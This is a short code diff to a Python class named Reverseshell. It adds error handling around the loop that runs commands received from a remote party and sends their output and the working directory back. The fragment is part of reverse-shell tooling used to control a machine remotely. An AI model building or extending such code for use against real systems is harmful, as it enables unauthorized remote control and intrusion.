@@ -20,9 +20,11 @@ class Reverseshell:
             elif command == "":
                 display_msg("No command entered", "r")
             else:
-                cmd_result = self.execute_commands(command)
-                client.send_data(cmd_result)
-
+                try:
+                    cmd_result = self.execute_commands(command)
+                    client.send_data(cmd_result)
+                except Exception as err:
+                    client.send_data("Unable to execute command some random error occured\n" + str(err))
             new_pwd = os.getcwd()
             client.send_data(new_pwd)
     
